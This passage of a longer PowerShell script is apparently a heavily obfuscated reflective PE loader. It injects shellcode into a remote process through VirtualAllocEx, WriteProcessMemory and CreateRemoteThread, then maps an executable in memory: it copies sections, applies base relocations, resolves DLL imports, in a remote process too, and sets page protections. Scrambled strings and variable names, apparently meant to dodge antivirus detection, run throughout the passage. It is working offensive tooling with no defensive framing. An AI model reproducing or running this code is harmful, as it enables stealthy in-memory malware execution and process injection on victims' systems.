		&("{0}{3}{1}{2}{4}" -f 'Write-B','te','sTo','y','Memory') -Bytes ${g`etpROC`ADDre`s`S`sC3} -MemoryAddress ${S`C`pSmem}
		${ScpS`meM} = &("{0}{3}{1}{2}{5}{4}" -f 'Add-Sig','ed','IntAsUnsi','n','d','gne') ${S`CpSMeM} (${GETPR`OcAdD`RES`ssc3}."L`eNG`TH")
		 ${jK`5`mBh}::("{3}{1}{0}{2}"-f'uc','r','tureToPtr','St').Invoke(${g`Etpr`o`CAD`DRESSa`dDr}, ${ScP`SMEM}, ${F`ALsE})
		${sC`PSMem} = &("{0}{3}{1}{2}"-f 'Add-Sig','dInt','AsUnsigned','ne') ${S`CPSM`EM} (${p`TRsI`Ze})
		&("{0}{3}{1}{2}"-f 'Write-B','ToMe','mory','ytes') -Bytes ${G`ETPr`ocad`DR`eSSS`C4} -MemoryAddress ${S`c`pSMEm}
		${Sc`p`SmEM} = &("{2}{0}{1}{5}{3}{4}{6}"-f 'd-','Sign','Ad','IntAsU','nsign','ed','ed') ${scpsm`eM} (${G`etProcaDDrES`SS`C4}."l`eNGtH")
		  (  dir ("{0}{2}{3}{1}"-f'v','h','AriABle:','jK5mb'))."vaL`Ue"::("{0}{1}{2}"-f 'St','ructureTo','Ptr').Invoke(${GETproCAD`d`RE`SSRet`meM}, ${s`CPsm`eM}, ${fa`l`sE})
		${SC`pSm`eM} = &("{0}{2}{4}{3}{1}" -f 'Ad','Unsigned','d-Sign','s','edIntA') ${SC`PS`MeM} (${PTRSi`Ze})
		&("{0}{2}{3}{1}" -f 'Wr','ToMemory','ite','-Bytes') -Bytes ${geTp`Rocad`DRe`s`SS`C5} -MemoryAddress ${sCpSM`eM}
		${sc`PSMeM} = &("{2}{4}{3}{0}{1}" -f'tAsUnsig','ned','Add-S','edIn','ign') ${S`cP`SmeM} (${GETPr`OCaDD`R`eSS`sc5}."LeNG`TH")
		
		${r`sCa`dDR} = ${W`In32`Fu`Nct`IoNs}."V`Irt`UaLa`llOC`EX"."iNV`OkE"(${rEmOtePR`O`c`HA`NDle},  ( ITem ('vArIable:JP'+'7'+'D'))."Va`lUe"::"zE`RO", [UIntPtr][UInt64]${sC`leng`Th}, ${win32co`NS`T`A`NTS}."MEm_C`oM`MIt" -bor ${wIN32co`NsTA`NtS}."Me`m_reS`er`VE", ${wi`N32C`O`N`StaNtS}."P`A`gE_EXe`CUTE_reaD`w`Ri`Te")
		if (${rs`CA`DdR} -eq  ${JP`7d}::"Z`eRo")
		{
			Throw ("{2}{6}{4}{5}{3}{1}{12}{10}{0}{9}{7}{8}{11}"-f 'mote p','o','Unable','e mem','to alloc','at',' ','for',' she','rocess ',' the re','llcode','ry in')
		}
		
		${s`UCCeSS} = ${wIN32Fu`Nct`ioNs}."wr`IteProCe`Ss`meMoRy"."IN`V`oke"(${Rem`O`TEP`RoChAndLE}, ${RsCa`ddR}, ${scpS`M`emO`Ri`gINaL}, [UIntPtr][UInt64]${SClEn`g`TH}, [Ref]${NUM`By`TE`swR`It`TeN})
		if ((${Su`ccess} -eq ${FA`LSE}) -or ([UInt64]${nu`mBy`TEsWR`I`TTEn} -ne [UInt64]${SCL`enG`Th}))
		{
			Throw ("{5}{6}{3}{4}{0}{7}{8}{2}{1}"-f 'r','ry.','memo','shellcode to remote ','p','Un','able to write ','ocess',' ')
		}
		
		${RtHrea`dH`A`N`DLE} = &("{4}{3}{0}{5}{2}{1}"-f '-Create','read','Th','oke','Inv','Remote') -ProcessHandle ${Remot`EP`RocH`AnDle} -StartAddress ${Rs`cADdR} -Win32Functions ${Wi`N32fu`NCT`ioNs}
		${rES`UlT} = ${wIN3`2fU`Nct`IOnS}."waiTFo`RS`in`gLeob`JeCT"."invo`kE"(${RThr`eAd`HA`NDle}, 20000)
		if (${R`ESULt} -ne 0)
		{
			Throw ("{2}{1}{12}{11}{9}{7}{4}{0}{8}{3}{13}{6}{5}{10}"-f ' ','all to C','C','all ','oteThread to','ddress ','tProcA','m','c','teRe','failed.','ea','r','Ge')
		}
		
		[IntPtr]${R`ET`URNvAlmeM} =   ( get-vAriaBle  ("J"+"K"+"5MBh") -ValueO)::("{0}{2}{1}"-f'A','cHGlobal','llo').Invoke(${Pt`RSi`ze})
		${RE`S`UlT} = ${wIN32`FuNCtiO`NS}."R`EaDP`ROCesS`MeMoRy"."iN`V`Oke"(${r`emo`Te`pRO`chANDle}, ${GetProCa`dd`RE`s`SrETM`em}, ${rETUrN`VA`LMeM}, [UIntPtr][UInt64]${p`Trsize}, [Ref]${NuMB`Yt`esWRItT`eN})
		if ((${rE`su`Lt} -eq ${F`Alse}) -or (${nuMB`ytEs`wRiTt`EN} -eq 0))
		{
			Throw ("{7}{1}{8}{4}{0}{3}{5}{6}{2}"-f'essM','l','d','e','to ReadProc','mor','y faile','Ca','l ')
		}
		[IntPtr]${PrO`c`ADdREsS} =  (DIr ("Var"+"iab"+"Le:"+"Jk"+"5Mbh"))."VAL`Ue"::"ptrTO`STRUC`T`U`RE"(${r`e`TurnV`ALmEM}, [Type][IntPtr])

		${w`I`N32FUNCt`ions}."v`IrTuaLFR`eeEX"."I`N`VOkE"(${rEmOt`eProc`ha`NDlE}, ${rs`caD`DR}, [UIntPtr][UInt64]0, ${Win3`2CONsT`A`Nts}."ME`M_rele`A`se") | &("{1}{0}" -f'Null','Out-')
		${WiN`32funcT`iONS}."vIrtualF`R`ee`EX"."I`NvOkE"(${REM`OTE`pr`oChan`dlE}, ${rf`UNC`NA`MepTR}, [UIntPtr][UInt64]0, ${win`3`2COnS`Tan`TS}."Mem_`RelE`AsE") | &("{1}{0}"-f'ull','Out-N')
		${WI`N`32FUncTi`o`NS}."v`i`RTua`LFR`eEEX"."Inv`OkE"(${Re`MOt`e`prOCha`Nd`lE}, ${GEt`PR`o`CAdDres`Sr`Et`MEm}, [UIntPtr][UInt64]0, ${w`In3`2c`on`StaNTs}."mem_REL`ea`SE") | &("{2}{0}{1}" -f'u','t-Null','O')
		
		return ${p`R`ocadD`RESS}
	}


	Function COp`y-s`EC`TiOnS
	{
		Param(
		[Parameter(POSiTIoN = 0, MANdatoRY = ${tr`Ue})]
		[Byte[]]
		${p`EBytEs},
		
		[Parameter(posITIOn = 1, mandatorY = ${Tr`UE})]
		[System.Object]
		${pE`in`Fo},
		
		[Parameter(PosITion = 2, MANDAToRy = ${Tr`UE})]
		[System.Object]
		${wiN32`Fun`C`TI`OnS},
		
		[Parameter(pOsITiOn = 3, ManDAtorY = ${T`RuE})]
		[System.Object]
		${W`I`N32TypeS}
		)
		
		for( ${i} = 0; ${i} -lt ${peIn`Fo}."IMA`GE`_NT_h`eaD`E`RS"."fiL`E`HeADeR"."numb`EroFsE`CT`iO`Ns"; ${I}++)
		{
			[IntPtr]${SEcTI`oN`H`e`AdERPtR} = [IntPtr](&("{4}{1}{3}{5}{2}{6}{0}" -f 'ed','d-S','sUnsig','i','Ad','gnedIntA','n') ([Int64]${peIn`FO}."Se`CTIonHe`ADe`R`pTr") (${i} *  ( Get-VariablE ("{1}{0}"-f 'H','jk5MB')  )."VAL`UE"::"SIZ`e`Of"([Type]${wi`N3`2TYP`Es}."ImagE_`seCTi`ON_h`eaD`er")))
			${Sec`TiOn`hEAdEr} =   ${Jk5`MBH}::"Pt`R`TostRUcT`U`Re"(${SEctIO`NH`e`AD`eRp`Tr}, [Type]${wi`N32ty`p`eS}."imAg`e`_`SECtIO`N_header")
		
			[IntPtr]${s`EctIoN`DEs`Tad`DR} = [IntPtr](&("{1}{2}{3}{4}{0}"-f'nsigned','Add-','SignedIntA','s','U') ([Int64]${pEIN`Fo}."PEH`An`Dle") ([Int64]${Se`ct`IONhe`ADER}."vIRtuALadd`R`E`sS"))
			

			${SIZeOFR`AW`da`TA} = ${s`ec`TiOnHeAd`er}."SIz`EO`FrAw`daTA"

			if (${secTi`oNh`EA`D`eR}."P`OI`NTERTo`RaWd`ATa" -eq 0)
			{
				${Si`ZEof`Ra`WdaTA} = 0
			}
			
			if (${s`IZeofra`wda`Ta} -gt ${sEC`TiON`HEA`D`eR}."v`iRTuAls`Ize")
			{
				${S`IZ`e`OFRAWd`Ata} = ${Se`ct`IONh`eAD`er}."vI`R`TUaLs`IZe"
			}
			
			if (${siZe`OfR`AW`DATA} -gt 0)
			{
				&("{4}{5}{3}{1}{2}{6}{0}" -f 'd','Ran','geVa','y','T','est-Memor','li') -DebugString ("{5}{2}{4}{6}{7}{3}{0}{1}"-f'n','s::MarshalCopy','p','o','y','Co','-','Secti') -PEInfo ${PE`infO} -StartAddress ${sECTIo`Nd`EsT`Ad`Dr} -Size ${Siz`eOfr`Awda`TA} | &("{0}{2}{1}"-f 'Out-','l','Nul')
				 ${jk5m`BH}::"c`Opy"(${P`e`BYtES}, [Int32]${SE`ct`IO`N`heADeR}."Poi`Nt`ERTOrAwD`ATa", ${SeCtion`DESt`A`d`dr}, ${Sizeof`Ra`Wda`TA})
			}
		
			if (${sECTI`onHEA`d`ER}."siZeo`Fr`Aw`dA`TA" -lt ${sect`ioNH`EADeR}."V`IRt`U`AlSize")
			{
				${dIFFerE`N`CE} = ${SECTIONhEA`d`Er}."V`IR`TuAlSize" - ${siZeoFrA`w`d`ATa}
				[IntPtr]${stArT`A`DDr`ESs} = [IntPtr](&("{4}{5}{6}{3}{1}{0}{7}{2}" -f 'sUn','A','ed','nt','Add-','Sig','nedI','sign') ([Int64]${sEcTiO`ND`Estad`DR}) ([Int64]${SIZEO`FrA`W`data}))
				&("{1}{2}{3}{0}{4}"-f 'ngeVa','Te','st-M','emoryRa','lid') -DebugString ("{4}{2}{3}{5}{0}{1}" -f'tions','::Memset','p','y-S','Co','ec') -PEInfo ${P`eiN`Fo} -StartAddress ${STarT`ADD`R`EsS} -Size ${DIf`F`erEnce} | &("{2}{1}{0}"-f 'll','ut-Nu','O')
				${wIn`32f`UnCTIons}."Me`Mset"."iN`VO`KE"(${StAR`TaDdR`E`Ss}, 0, [IntPtr]${d`I`FfE`RENCe}) | &("{1}{0}" -f 't-Null','Ou')
			}
		}
	}


	Function UPd`AT`E`-ME`MorYAD`DRe`SseS
	{
		Param(
		[Parameter(poSitION = 0, MaNDaTory = ${t`Rue})]
		[System.Object]
		${Pei`Nfo},
		
		[Parameter(positiOn = 1, manDatORy = ${T`Rue})]
		[Int64]
		${Ori`GinAl`IMa`GEBa`se},
		
		[Parameter(positIon = 2, mAndaTOrY = ${T`Rue})]
		[System.Object]
		${w`i`N3`2co`NsTaNTs},
		
		[Parameter(POSiTiON = 3, maNDaTOry = ${TR`Ue})]
		[System.Object]
		${wIn32T`y`p`ES}
		)
		
		[Int64]${b`A`sEdIfFere`Nce} = 0
		${a`dd`dIFFE`RE`NCE} = ${T`RuE} 
		[UInt32]${IM`A`gEB`AsE`ReL`OCSIZe} =   ( vArIABle ("jK5m"+"Bh") -vaLueONLy  )::"S`izE`Of"([Type]${w`In32TY`PeS}."Im`AgE`_`B`A`Se_reLoc`AtIoN")
		
		if ((${oRiG`iN`AlIMA`GebASe} -eq [Int64]${PEIN`Fo}."effectI`Vep`e`hANdLe") `
				-or (${pEI`NFO}."i`maGe`_`NT_HeAderS"."OPTIoNA`lhe`AD`Er"."bA`SerElOCA`Ti`oNta`Ble"."s`IZe" -eq 0))
		{
			return
		}


		elseif ((&("{1}{7}{3}{0}{6}{2}{4}{5}" -f'Gre','Compare','terTh','Val1','anVal2AsUI','nt','a','-') (${ORIg`InAlim`A`Geb`ASE}) (${P`e`iNFO}."EfF`ec`TiVE`p`EHAn`dLe")) -eq ${T`RUe})
		{
			${BAsedi`Ff`eRe`NcE} = &("{1}{0}{2}{4}{3}{5}"-f 'ignedI','Sub-S','ntA','gn','sUnsi','ed') (${oRi`Gina`Li`mage`BAsE}) (${pe`info}."E`FFec`TiVEPEHa`N`dLe")
			${adDdIFfer`E`N`Ce} = ${f`Alse}
		}
		elseif ((&("{1}{5}{4}{0}{3}{2}"-f 'eater','C','l2AsUInt','ThanVa','pare-Val1Gr','om') (${p`EiN`FO}."efFECTIve`pE`hAn`DLE") (${OR`igiNALI`mAGeb`Ase})) -eq ${tr`UE})
		{
			${bAsEd`IFFE`Re`Nce} = &("{3}{2}{0}{4}{1}" -f'SignedInt','igned','ub-','S','AsUns') (${peiN`FO}."eF`FeC`Tiv`EPE`han`DLE") (${ori`GInA`Lim`Ag`EBA`SE})
		}
		
		[IntPtr]${bAs`eRE`LOCPtr} = [IntPtr](&("{1}{2}{3}{0}{4}{5}"-f'Uns','Add-S','igne','dIntAs','i','gned') ([Int64]${p`EI`NFo}."PEH`AnD`lE") ([Int64]${pei`N`Fo}."Im`AGe`_`NT_HeadERs"."OpTiOn`AlH`e`A`der"."baser`EL`OC`ATiONT`A`BlE"."V`ir`TuA`lAdDress"))
		while(${tr`UE})
		{
			${baserE`locAt`I`oNTaBlE} =   (  VArIabLE  ("{0}{2}{1}"-f'jk','h','5Mb') )."VAL`UE"::"p`TRTO`StrU`ct`Ure"(${B`ASE`RELOCpTR}, [Type]${wIn`3`2T`YPES}."I`MagE_`BAs`e`_ReLo`cA`TiOn")

			if (${b`AseREloCatIo`N`TaB`lE}."siZEo`FBl`OCK" -eq 0)
			{
				break
			}

			[IntPtr]${M`E`m`ADdRBASe} = [IntPtr](&("{1}{4}{0}{5}{2}{6}{3}" -f'edIntAs','A','sig','d','dd-Sign','Un','ne') ([Int64]${p`e`iNfO}."PeHaN`D`Le") ([Int64]${BASE`ReL`ocA`TIO`Nt`AbLE}."VI`R`TuA`LaDdRESs"))
			${NumreL`Oc`AT`io`Ns} = (${bA`SE`ReL`ocA`TiON`Ta`Ble}."SI`ze`o`FbLOCK" - ${I`M`Ag`EB`ASerelo`C`SIZE}) / 2

			for(${I} = 0; ${I} -lt ${nU`MreL`oca`TIO`NS}; ${I}++)
			{
				${rElOc`AT`I`onINFO`ptR} = [IntPtr](&("{1}{2}{3}{0}"-f 'Unsigned','Add-Sign','ed','IntAs') ([IntPtr]${BAs`eR`EL`oCP`Tr}) ([Int64]${iMaG`eBase`Reloc`s`iZE} + (2 * ${I})))
				[UInt16]${RELoC`A`TIO`NINFO} =   (GEt-varIaBLe  ("j"+"K5Mb"+"h")  )."v`ALUe"::"ptrtOSTr`U`ctu`Re"(${r`ElOC`ATio`Nin`FoptR}, [Type][UInt16])

				[UInt16]${reLOco`F`FS`et} = ${REL`O`cAtiO`NI`NFo} -band 0x0FFF
				[UInt16]${Rel`octY`PE} = ${RELoCa`T`ioN`iN`Fo} -band 0xF000
				for (${j} = 0; ${J} -lt 12; ${j}++)
				{
					${reL`oCty`PE} =  ${8O`WAb}::("{1}{0}" -f 'loor','F').Invoke(${Relo`C`Type} / 2)
				}


				if ((${r`El`octy`pe} -eq ${wIN3`2`COn`STANts}."IMa`Ge_`REl_BA`sed_h`i`gHloW") `
						-or (${rElOC`Ty`pE} -eq ${WI`N32con`staNTs}."Imag`e`_`Re`L_BAs`ED_DiR64"))
				{			
					[IntPtr]${F`in`AL`ADdR} = [IntPtr](&("{6}{0}{1}{3}{4}{7}{2}{5}" -f'dd-S','igne','ign','d','Int','ed','A','AsUns') ([Int64]${M`eMA`d`drbASe}) ([Int64]${reLo`c`of`FSet}))
					[IntPtr]${C`UR`Ra`ddR} =   ${J`K5`MBH}::"p`T`RtOst`RUc`Ture"(${fiNal`A`dDR}, [Type][IntPtr])
		
					if (${aDDdI`FfE`Ren`cE} -eq ${T`RUe})
					{
						[IntPtr]${c`URr`AdDr} = [IntPtr](&("{6}{0}{4}{2}{5}{1}{3}" -f 'dd','igne','igne','d','-S','dIntAsUns','A') ([Int64]${c`URRA`DdR}) (${BA`s`Ed`ifFE`RENce}))
					}
					else
					{
						[IntPtr]${cu`RRA`DdR} = [IntPtr](&("{3}{5}{1}{0}{6}{2}{4}"-f'gned','i','sign','S','ed','ub-S','IntAsUn') ([Int64]${cUR`R`ADDr}) (${bASedIf`FeR`eNcE}))
					}				

					 (  VaRIabLe  ('Jk5'+'M'+'Bh') )."VA`LUE"::("{3}{0}{2}{1}"-f 'tru','tr','ctureToP','S').Invoke(${CU`Rr`ADDR}, ${f`I`NaladDR}, ${fal`Se}) | &("{1}{2}{0}" -f'ull','O','ut-N')
				}
				elseif (${rELOc`TY`Pe} -ne ${win`32`COnSTA`NTs}."Ima`GE_re`L`_BASeD`_Ab`S`OL`UtE")
				{
					Throw ('U'+'n'+'known '+'r'+'eloc'+'ati'+'on '+'found,'+' '+'reloc'+'a'+'t'+'ion '+'va'+'lue:'+' '+"$RelocType, "+'relocatio'+'nin'+'fo: '+"$RelocationInfo")
				}
			}
			
			${BaSER`E`lOCptr} = [IntPtr](&("{4}{2}{0}{6}{5}{3}{1}" -f 'Si','gned','d-','i','Ad','Uns','gnedIntAs') ([Int64]${BASe`RELOc`ptr}) ([Int64]${BaSE`Re`lOCATIO`NTAB`LE}."sIzE`Of`BL`OCK"))
		}
	}


	Function iMp`oRt`-DL`LImporTS
	{
		Param(
		[Parameter(PosITIoN = 0, mANdaTOrY = ${tR`Ue})]
		[System.Object]
		${p`E`INFo},
		
		[Parameter(PosITIoN = 1, MANDAtory = ${t`RUe})]
		[System.Object]
		${wiN32Fu`N`cTIo`Ns},
		
		[Parameter(poSITiON = 2, MaNDatOry = ${T`RUe})]
		[System.Object]
		${Wi`N`32TYPEs},
		
		[Parameter(POSiTion = 3, maNDatory = ${tr`UE})]
		[System.Object]
		${wIN32coN`S`T`An`TS},
		
		[Parameter(PoSitiON = 4, MANdaTOrY = ${FA`l`se})]
		[IntPtr]
		${r`EMo`Te`PROchAnDle}
		)
		
		${r`eMOTe`LO`Ad`INg} = ${f`AlSe}
		if (${P`EI`NFO}."peH`AnD`lE" -ne ${pEI`N`Fo}."EfFE`ctivEpE`H`ANDLe")
		{
			${REm`oteLOa`d`i`Ng} = ${T`Rue}
		}
		
		if (${P`eiNFO}."IMa`GE_Nt_`H`EadeRS"."O`pTIonALH`Eader"."imp`Or`T`TAble"."si`zE" -gt 0)
		{
			[IntPtr]${imP`o`RtdEsCRI`ptOr`ptR} = &("{4}{3}{0}{1}{2}" -f'-SignedIn','tAsUnsign','ed','d','Ad') ([Int64]${PE`InfO}."PEH`Andle") ([Int64]${P`E`InFo}."i`MAG`E_`Nt_heADe`Rs"."O`pt`ionAL`hE`ADEr"."IMPOR`TtAB`Le"."v`IrTUAladDRE`ss")
			
			while (${tr`Ue})
			{
				${I`mporT`d`ESCrIptoR} =   (  VarIaBLE  ('jk5m'+'bH')  -VaLuEoNl )::"PTrto`S`TRUc`TURe"(${I`MpO`R`T`dEScri`ptorPTR}, [Type]${WI`N32t`YP`Es}."iM`Age_`IMpo`RT_d`eSC`RIp`TOR")
				
				if (${i`mPoRT`desCrI`PtoR}."Ch`Ar`ACTEriSTiCs" -eq 0 `
						-and ${I`M`POrtDEsc`RiPTOR}."F`irst`ThUnk" -eq 0 `
						-and ${imP`oR`T`desCriP`T`OR}."F`o`RWarDe`R`CHaIn" -eq 0 `
						-and ${IMpoRTD`es`CR`I`pToR}."NA`me" -eq 0 `
						-and ${iMpOR`T`desCRI`ptor}."tIme`d`A`T`ESTaMP" -eq 0)
				{
					&("{0}{2}{1}" -f'W','ose','rite-Verb') ("{5}{7}{3}{2}{0}{8}{1}{6}{4}"-f 'm','o','L i','rting DL','s','Don','rt','e impo','p')
					break
				}

				${impor`TdLlhA`NDLE} =   ${jp`7D}::"Z`erO"
				${i`MPORTD`lLpAth`ptR} = (&("{0}{2}{5}{1}{3}{4}{6}"-f 'Add-S','s','i','Uns','igne','gnedIntA','d') ([Int64]${pe`in`FO}."PEh`AND`lE") ([Int64]${im`p`oRtD`ESC`RipTor}."n`Ame"))
				${iMpOr`Td`llPATh} =  ( gEt-CHIlDItem  ('VAriAB'+'L'+'e:'+'jk5MbH') )."vAL`Ue"::("{2}{3}{0}{1}" -f 'ingAns','i','P','trToStr').Invoke(${IMp`orTdLLpa`T`Hptr})
				
				if (${Remot`E`lo`Ad`Ing} -eq ${Tr`Ue})
				{
					${ImP`O`R`TdLLH`ANdlE} = &("{2}{4}{1}{3}{0}" -f'nRemoteProcess','l','Impor','I','t-Dl') -RemoteProcHandle ${RE`mOtEprOCH`An`DlE} -ImportDllPathPtr ${ImP`oRTdllpAt`H`pTR}
				}
				else
				{
					${imPortDL`L`haN`dLE} = ${Win32`FuNC`T`IoNS}."lo`AdliBR`ArY"."InV`Oke"(${ImpoR`TD`lLPa`TH})
				}

				if ((${impORT`dll`HANd`le} -eq ${N`UlL}) -or (${I`MpO`RtDLl`haNdLE} -eq   ( get-cHIlDITeM ("VA"+"RI"+"ablE"+":jP7d") )."vAL`UE"::"z`ERO"))
				{
					throw ('Err'+'or '+'impo'+'rti'+'ng '+'DLL,'+' '+'DLL'+'Name: '+"$ImportDllPath")
				}
				
				[IntPtr]${Th`UnK`ReF} = &("{3}{4}{0}{5}{1}{2}"-f 't','i','gned','Add-Signed','In','AsUns') (${p`E`inFo}."pE`H`ANDLe") (${ImpO`RtDE`scRIP`TOr}."f`iR`stthu`Nk")
				[IntPtr]${Or`iGINaLThuN`k`Ref} = &("{0}{7}{3}{4}{6}{1}{2}{5}"-f 'A','Int','AsUn','Si','gn','signed','ed','dd-') (${p`EIN`FO}."p`EhA`NDle") (${I`mp`OrtDe`s`c`RIPTOr}."CHA`RACte`R`ISTi`Cs") 
				[IntPtr]${o`RigIna`LThunkrE`F`V`Al} =  (  itEm ('V'+'aRIAB'+'Le:jK'+'5MBH'))."v`ALuE"::"p`TR`To`StruCTure"(${O`RI`giN`AlThuNKRef}, [Type][IntPtr])
				
				while (${O`RIg`inAltHUnkRE`FVAl} -ne  ${JP`7D}::"z`erO")
				{
					${p`R`oce`d`UreNamE} = ''

					[IntPtr]${NeW`Thunkr`Ef} =   ${j`p7D}::"Z`erO"
					if([Int64]${orI`g`INALthUN`KRe`F`VAl} -lt 0)
					{
						${Pr`OCeDur`enaMe} = [Int64]${ORigina`L`Th`UnkREFVal} -band 0xffff 
					}
					else
					{
						[IntPtr]${STr`ING`ADdR} = &("{1}{5}{2}{0}{3}{6}{4}"-f'As','Add-S','t','Un','igned','ignedIn','s') (${PeI`N`Fo}."PEha`ND`le") (${o`R`Iginal`T`HuNKrE`Fv`Al})
						${Stri`NG`AdDR} = &("{1}{2}{3}{0}{4}"-f 'A','Add-S','i','gnedInt','sUnsigned') ${st`R`iNGadDR} ( ( VaRIaBLe  ('J'+'k5mBH') -VaLUe )::"SIz`Eof"([Type][UInt16]))
						${PRoCEdU`R`eN`A`ME} =   (DIR ("v"+"aRiabLE:jk"+"5mb"+"H") )."val`Ue"::("{3}{2}{0}{1}" -f 'tringAn','si','trToS','P').Invoke(${sT`RINg`ADdR})
					}
					
					if (${R`eMot`ELo`AD`ING} -eq ${TR`UE})
					{
						[IntPtr]${Ne`w`ThuNkREF} = &("{1}{0}{3}{2}" -f'd','Get-RemoteProcA','ss','dre') -RemoteProcHandle ${r`EmO`TePr`ocHa`NdLE} -RemoteDllHandle ${i`mpORt`DLlh`AnDle} -FunctionName ${P`R`oCe`durEnAME}
					}
					else
					{
						if(${pR`OCeDu`Ren`AmE} -is [string])
						{
						    [IntPtr]${NEWtHu`NKR`EF} = ${W`In`32fUNCT`i`ONs}."getp`RocaDD`R`ess"."iN`V`okE"(${imPoR`TD`lL`HAndLe}, ${pRo`cedUREnA`me})
						}
						else
						{
						    [IntPtr]${NE`w`Thu`NkReF} = ${wiN32fU`N`Ct`I`ONs}."G`EtP`RoCAddRESSOR`di`NaL"."Inv`OKe"(${iMp`o`RTdLl`H`An`dLe}, ${P`ROCE`dUrEN`Ame})
						}
					}
					
					if (${nEwThu`NKR`eF} -eq ${nU`LL} -or ${nEWT`HuN`KREf} -eq   (  gEt-item  ('VaRI'+'Ab'+'L'+'e:jp7D'))."v`AluE"::"z`erO")
					{
						Throw ('Ne'+'w '+'fu'+'n'+'ction '+'ref'+'eren'+'ce '+'is'+' '+'nu'+'ll, '+'this'+' '+'is'+' '+'al'+'most'+' '+'cer'+'t'+'ainly '+'a '+'bu'+'g '+'in'+' '+'th'+'is '+'s'+'cript. '+'Fun'+'ctio'+'n: '+"$ProcedureName. "+'D'+'ll: '+"$ImportDllPath")
					}

					  ${j`k5mbh}::("{2}{3}{4}{1}{0}"-f 'r','t','Structu','re','ToP').Invoke(${newT`HuNK`REf}, ${THu`NKrEF}, ${f`Al`se})
					
					${th`Un`kReF} = &("{4}{0}{6}{5}{3}{2}{1}" -f'-S','ed','n','sig','Add','ntAsUn','ignedI') ([Int64]${T`hUn`KREF}) (  ${j`K5mbh}::"S`IZE`oF"([Type][IntPtr]))
					[IntPtr]${o`RIGI`Na`L`ThUnkreF} = &("{0}{2}{5}{4}{1}{3}" -f'A','si','dd','gned','ignedIntAsUn','-S') ([Int64]${o`RIgI`NaltHuN`K`REf}) (  ( gET-ChiLdiTem ("{1}{0}{3}{2}{4}"-f'IA','vaR','LE','B',':Jk5MbH'))."vA`lue"::"SI`Ze`of"([Type][IntPtr]))
					[IntPtr]${Origi`Nal`T`hUnkRe`FvAL} =   ${jK5`mBh}::"pT`RTO`St`R`UcTure"(${ORIG`I`Na`LtHu`Nkref}, [Type][IntPtr])
				}
				
				${I`mPOr`TDe`sCRIPtO`RPtR} = &("{3}{2}{0}{1}"-f'nsi','gned','SignedIntAsU','Add-') (${iMport`DEScri`p`TO`RpTr}) (  ${j`K5`MBH}::"sizE`oF"([Type]${w`in32Typ`eS}."I`MaG`E_I`m`poR`T_dEScrIptOR"))
			}
		}
	}

	Function get`-ViRTualPRoT`EC`T`V`A`lUe
	{
		Param(
		[Parameter(PoSitioN = 0, maNDaToRy = ${T`RUe})]
		[UInt32]
		${SeCt`i`OnCHArA`CTE`RI`s`TiCs}
		)
		
		${p`RoTeC`Ti`o`NfLag} = 0x0
		if ((${S`ECTionc`Ha`RAc`TErIsT`IcS} -band ${w`in32Con`Sta`Nts}."imAG`E_S`cN`_M`em_`Exec`UTE") -gt 0)
		{
			if ((${sE`ctio`N`C`haraC`TerIsT`Ics} -band ${w`I`N32ConSta`Nts}."imaGe_SCn_M`e`M`_ReaD") -gt 0)
			{
				if ((${SE`Ct`Io`N`characTERISt`ICS} -band ${wi`N32C`ON`StaNTs}."im`Age_`sCN_mem`_`wRiTE") -gt 0)
				{
					${PR`o`Te`cTionfLaG} = ${WIn32`C`ON`ST`ANTS}."PAgE_Ex`eCUtE_reA`dWR`ite"
				}
				else
				{
					${PRote`C`T`IONflaG} = ${WI`N`32CONs`Ta`NTS}."p`A`gE_Exe`cU`Te_rEAD"
				}
			}
			else
			{
				if ((${sE`cTiON`CHaRaCterist`IcS} -band ${W`iN32`Co`NStAN`Ts}."iMag`e_sCn_m`e`m`_WR`I`Te") -gt 0)
				{
					${pROTeC`T`i`o`NFLAG} = ${w`in32C`OnSTAn`Ts}."Pag`e`_`EXecUte_wR`iTE`cOpy"
				}
				else
				{
					${PR`otEc`T`Ion`FLAg} = ${Win3`2cO`Nsta`Nts}."P`AGe_`exEC`UTE"
				}
			}
		}
		else
		{
			if ((${S`Ecti`on`c`h`AracteriStiCS} -band ${W`IN32`CO`Ns`Tants}."IMA`G`e`_sCN_M`Em_rEAD") -gt 0)
			{
				if ((${sEcTI`O`NChaRAc`TEriStI`CS} -band ${WI`N32`consTa`N`Ts}."ImAGE_`S`cn_m`eM`_Wr`iTE") -gt 0)
				{
					${P`ROt`E`CtIOnFLag} = ${W`I`N32cONSt`A`NTs}."p`AGE_RE`Adw`RiTe"
				}
				else
				{
					${prO`T`ecTIONfLag} = ${WIn32Cons`Ta`NTs}."p`A`GE_rEADO`NlY"
				}
			}
			else
			{
				if ((${secT`io`N`ChArA`cTE`RIs`TICs} -band ${wi`N32con`S`TAnTs}."Im`AgE`_s`cn_`meM_wRitE") -gt 0)
				{
					${prOt`E`CTionFlag} = ${WiN3`2C`oNST`AnTS}."pAge_wRiT`ECo`pY"
				}
				else
				{
					${PR`ot`E`CTiONFLaG} = ${Wi`N32`CoNSTaN`TS}."pa`g`E_nOA`Ccess"
				}
			}
		}
		
		if ((${SE`cTi`O`N`CHA`RACTErIstiCS} -band ${WIn32`c`OnsT`A`NtS}."im`Age_sCn`_`MEm_NoT`_`CACHeD") -gt 0)
		{
			${PrO`TE`CTIonFL`Ag} = ${pRO`TEC`Ti`OnFlAg} -bor ${w`iN32`co`NSTaNtS}."P`AgE_N`oCa`CHE"
		}
		
		return ${pR`OteCt`iO`NFLAg}
	}

	Function Upd`AtE`-ME`MoRY`PrO`TECt`Ionfla`gS
	{
		Param(
		[Parameter(PoSItion = 0, MandAtoRY = ${tr`UE})]
		[System.Object]
		${P`Ei`Nfo},
		
		[Parameter(position = 1, manDATORy = ${tR`UE})]
		[System.Object]
		${Wi`N32`FUncTI`onS},
		
		[Parameter(posiTIoN = 2, MANDAtory = ${t`RUE})]
		[System.Object]
		${WiN3`2`cONs`TaNtS},
		
		[Parameter(pOSitiOn = 3, MaNdAToRY = ${Tr`UE})]
		[System.Object]
		${W`iN3`2`TYPEs}
		)
		
		for( ${I} = 0; ${I} -lt ${Pei`NFo}."ima`GE_n`T_HeA`De`Rs"."fIlehe`A`deR"."nU`mBEroFS`eCTi`oNS"; ${I}++)
		{
			[IntPtr]${SE`Ct`IonhE`ADer`P`TR} = [IntPtr](&("{3}{0}{2}{1}{4}"-f 'dd-Sig','ntAsUns','nedI','A','igned') ([Int64]${P`EIn`Fo}."Sec`TioNH`eaDerp`TR") (${i} *  ( Get-variaBLe  ("jk5M"+"bH"))."v`Alue"::"SiZE`OF"([Type]${wi`N32TY`pEs}."ImaGE_SEc`TI`On`_h`eaDEr")))
